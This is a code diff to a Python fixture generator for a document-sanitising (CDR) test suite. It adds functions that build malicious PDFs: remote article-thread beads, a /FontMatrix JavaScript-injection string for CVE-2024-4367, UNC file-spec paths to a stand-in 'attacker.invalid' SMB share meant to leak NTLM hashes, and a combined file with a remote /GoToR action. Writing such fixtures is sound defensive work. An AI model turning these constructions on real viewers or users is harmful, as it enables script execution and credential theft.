@@ -7,8 +7,9 @@ strips every threat.
 
 Usage:
     cd repo-root
-    source bin/activate
-    python docs/fixtures/generate_fixtures.py
+    python3.12 -m venv /tmp/cdrvenv
+    /tmp/cdrvenv/bin/pip install -r src/requirements.txt
+    /tmp/cdrvenv/bin/python docs/fixtures/generate_fixtures.py
 
     # Upload all fixtures for smoke / benchmark testing
     aws s3 cp docs/fixtures/ s3://$SOURCE_BUCKET/smoke/ --recursive --exclude "*.py" --exclude "*.md"
@@ -28,6 +29,10 @@ Output files:
     pdf_acroform_js.pdf               - PDF: AcroForm field /AA JavaScript action
     pdf_page_launch.pdf               - PDF: page-level /AA /O /Launch action
     pdf_multithreat.pdf               - PDF: /OpenAction + /EmbeddedFiles + AcroForm JS
+    pdf_threads.pdf                   - PDF: catalog /Threads article beads + /Thread action
+    pdf_fontmatrix_js.pdf             - PDF: Type3 /FontMatrix JS injection (CVE-2024-4367)
+    pdf_unc_xobject.pdf               - PDF: UNC paths in stream /F external file specs
+    pdf_lejon_multithreat.pdf         - PDF: /Threads + /FontMatrix + UNC /F + /GoToR
     gif_comment_block.gif             - GIF: comment extension block (0x21 0xFE)
     tiff_multiframe_exif.tiff         - TIFF: 3-frame TIFF with EXIF metadata in every frame
     jpeg_with_exif.jpg                - JPEG: GPS + camera model EXIF tags
@@ -697,6 +702,159 @@ def make_pdf_multithreat() -> bytes:
     return buf.getvalue()
 
 
+# ── PDF fixtures: vectors from the malicious-pdf taxonomy ──────────────────────
+# Modelled on attack families catalogued in jonaslejon/malicious-pdf (tests 29-34), but
+# written from scratch against the PDF spec — no upstream code is reused, and every
+# payload targets a reserved-invalid host so a fixture can never phone home.
+
+def make_pdf_threads() -> bytes:
+    """PDF with a catalog /Threads article structure carrying a remote bead file spec.
+
+    Article threads hang off the catalog, not a page/annotation/action, so they survive the
+    action sweeps entirely."""
+    pdf = pikepdf.Pdf.new()
+    pdf.add_blank_page()
+
+    bead = pdf.make_indirect(pikepdf.Dictionary(
+        Type=pikepdf.Name("/Bead"),
+        R=pikepdf.Array([0, 0, 100, 100]),
+    ))
+    thread = pdf.make_indirect(pikepdf.Dictionary(
+        Type=pikepdf.Name("/Thread"),
+        F=bead,
+        I=pikepdf.Dictionary(
+            Title=pikepdf.String("CDR Test: thread bead"),
+            Author=pikepdf.String("http://cdr.invalid/thread-callback"),
+        ),
+    ))
+    pdf.Root["/Threads"] = pikepdf.Array([thread])
+
+    # The /Thread *action* form as well — this one is already covered by the /OpenAction
+    # sweep, and is included so the fixture exercises both halves of the vector.
+    pdf.Root["/OpenAction"] = pikepdf.Dictionary(
+        S=pikepdf.Name("/Thread"),
+        F=pikepdf.String("http://cdr.invalid/thread-fetch"),
+        D=pikepdf.String("thread-dest"),
+    )
+
+    buf = io.BytesIO()
+    pdf.save(buf)
+    return buf.getvalue()
+
+
+def make_pdf_fontmatrix_js() -> bytes:
+    """PDF with a Type3 /FontMatrix carrying injected JS (CVE-2024-4367, PDF.js).
+
+    The viewer interpolated /FontMatrix elements into generated JavaScript; a string
+    element breaks out of the expression and executes."""
+    pdf = pikepdf.Pdf.new()
+    pdf.add_blank_page()
+
+    charproc = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
+    font = pdf.make_indirect(pikepdf.Dictionary(
+        Type=pikepdf.Name("/Font"),
+        Subtype=pikepdf.Name("/Type3"),
+        FontBBox=pikepdf.Array([0, 0, 1, 1]),
+        # Sixth element is a string, not a number — the injection point.
+        FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, pikepdf.String(
+            "0);globalThis.CDR_TEST_FONTMATRIX_PWNED=1;//")]),
+        CharProcs=pikepdf.Dictionary(a=charproc),
+        Encoding=pikepdf.Dictionary(Type=pikepdf.Name("/Encoding")),
+        FirstChar=0,
+        LastChar=0,
+        Widths=pikepdf.Array([0]),
+    ))
+    pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+
+    buf = io.BytesIO()
+    pdf.save(buf)
+    return buf.getvalue()
+
+
+def make_pdf_unc_xobject() -> bytes:
+    """PDF with UNC paths in stream /F external file specs (NTLM credential theft).
+
+    No action object is involved: the viewer fetches the stream data from the UNC share on
+    open, leaking the user's NTLM hash to the attacker's SMB server."""
+    unc = "\\\\attacker.invalid\\share\\steal"
+    pdf = pikepdf.Pdf.new()
+    pdf.add_blank_page()
+
+    form_xobj = pdf.make_stream(b"q Q\n")
+    form_xobj[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
+    form_xobj[pikepdf.Name("/Subtype")] = pikepdf.Name("/Form")
+    form_xobj[pikepdf.Name("/BBox")] = pikepdf.Array([0, 0, 10, 10])
+    form_xobj[pikepdf.Name("/F")] = pikepdf.String(unc)
+
+    img_xobj = pdf.make_stream(b"\x00")
+    img_xobj[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
+    img_xobj[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
+    img_xobj[pikepdf.Name("/Width")] = 1
+    img_xobj[pikepdf.Name("/Height")] = 1
+    img_xobj[pikepdf.Name("/BitsPerComponent")] = 8
+    img_xobj[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
+    img_xobj[pikepdf.Name("/F")] = pikepdf.String(unc)
+
+    pdf.pages[0].Resources = pikepdf.Dictionary(
+        XObject=pikepdf.Dictionary(X0=form_xobj, Im0=img_xobj))
+
+    buf = io.BytesIO()
+    pdf.save(buf)
+    return buf.getvalue()
+
+
+def make_pdf_lejon_multithreat() -> bytes:
+    """PDF combining all three of the above with a remote /GoToR annotation action."""
+    pdf = pikepdf.Pdf.new()
+    pdf.add_blank_page()
+
+    pdf.Root["/Threads"] = pikepdf.Array([pdf.make_indirect(pikepdf.Dictionary(
+        Type=pikepdf.Name("/Thread"),
+        I=pikepdf.Dictionary(Title=pikepdf.String("CDR Test: multithreat thread")),
+    ))])
+
+    charproc = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
+    font = pdf.make_indirect(pikepdf.Dictionary(
+        Type=pikepdf.Name("/Font"),
+        Subtype=pikepdf.Name("/Type3"),
+        FontBBox=pikepdf.Array([0, 0, 1, 1]),
+        FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, pikepdf.String(
+            "0);globalThis.CDR_TEST_MULTI_PWNED=1;//")]),
+        CharProcs=pikepdf.Dictionary(a=charproc),
+        FirstChar=0, LastChar=0, Widths=pikepdf.Array([0]),
+    ))
+
+    img_xobj = pdf.make_stream(b"\x00")
+    img_xobj[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
+    img_xobj[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
+    img_xobj[pikepdf.Name("/Width")] = 1
+    img_xobj[pikepdf.Name("/Height")] = 1
+    img_xobj[pikepdf.Name("/BitsPerComponent")] = 8
+    img_xobj[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
+    img_xobj[pikepdf.Name("/F")] = pikepdf.String("\\\\attacker.invalid\\share\\multi")
+
+    pdf.pages[0].Resources = pikepdf.Dictionary(
+        Font=pikepdf.Dictionary(F1=font),
+        XObject=pikepdf.Dictionary(Im0=img_xobj),
+    )
+
+    goto_annot = pdf.make_indirect(pikepdf.Dictionary(
+        Type=pikepdf.Name("/Annot"),
+        Subtype=pikepdf.Name("/Link"),
+        Rect=pikepdf.Array([0, 0, 10, 10]),
+        A=pikepdf.Dictionary(
+            S=pikepdf.Name("/GoToR"),
+            F=pikepdf.String("\\\\attacker.invalid\\share\\gotor"),
+            D=pikepdf.Array([0, pikepdf.Name("/Fit")]),
+        ),
+    ))
+    pdf.pages[0].obj["/Annots"] = pikepdf.Array([goto_annot])
+
+    buf = io.BytesIO()
+    pdf.save(buf)
+    return buf.getvalue()
+
+
 # ── Image fixtures ─────────────────────────────────────────────────────────────
 
 def make_gif_comment_block() -> bytes:
@@ -830,6 +988,10 @@ FIXTURES: list[tuple[str, object]] = [
     ("pdf_acroform_js.pdf",          make_pdf_acroform_js),
     ("pdf_page_launch.pdf",          make_pdf_page_launch),
     ("pdf_multithreat.pdf",          make_pdf_multithreat),
+    ("pdf_threads.pdf",              make_pdf_threads),
+    ("pdf_fontmatrix_js.pdf",        make_pdf_fontmatrix_js),
+    ("pdf_unc_xobject.pdf",          make_pdf_unc_xobject),
+    ("pdf_lejon_multithreat.pdf",    make_pdf_lejon_multithreat),
     ("gif_comment_block.gif",        make_gif_comment_block),
     ("tiff_multiframe_exif.tiff",    make_tiff_multiframe_exif),
     ("jpeg_with_exif.jpg",           make_jpeg_with_exif),
